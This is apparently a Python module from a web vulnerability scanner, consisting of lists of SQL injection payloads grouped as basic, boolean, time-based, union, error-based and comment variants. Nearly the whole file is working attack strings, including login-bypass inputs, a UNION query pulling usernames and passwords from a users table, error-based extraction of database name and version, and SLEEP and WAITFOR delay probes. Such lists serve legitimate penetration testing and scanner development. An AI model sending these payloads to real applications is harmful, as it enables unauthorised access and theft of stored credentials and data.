"""
SQL Injection Payloads for vulnerability testing
"""

# Basic SQL Injection Payloads
BASIC_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 'x'='x",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
]

# Boolean-based SQLi Payloads
BOOLEAN_PAYLOADS = [
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",
]

# Time-based Blind SQLi Payloads
TIME_BASED_PAYLOADS = [
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000, MD5('test'))--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
]

# Union-based SQLi Payloads
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL, NULL, NULL--",
    "' UNION SELECT username, password FROM users--",
    "' UNION SELECT @@version, NULL--",
]

# Error-based SQLi Payloads
ERROR_PAYLOADS = [
    "' AND extractvalue(rand(), concat(0x3a, (SELECT database())))--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(126), @@version, CHAR(126), FLOOR(RAND(0)*2)) AS x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y)--",
]

# Comment-based variations
COMMENT_PAYLOADS = [
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1\" --",
    "\" OR \"1\"=\"1\" #",
    "\" OR \"1\"=\"1\" /*",
]

# POST Data Payloads (for form data)
POST_PAYLOADS = {
    "basic": BASIC_PAYLOADS,
    "boolean": BOOLEAN_PAYLOADS,
    "time_based": TIME_BASED_PAYLOADS,
    "union": UNION_PAYLOADS,
    "error": ERROR_PAYLOADS,
}

def get_all_payloads():
    """Get all payloads combined"""
    return BASIC_PAYLOADS + BOOLEAN_PAYLOADS + UNION_PAYLOADS + COMMENT_PAYLOADS
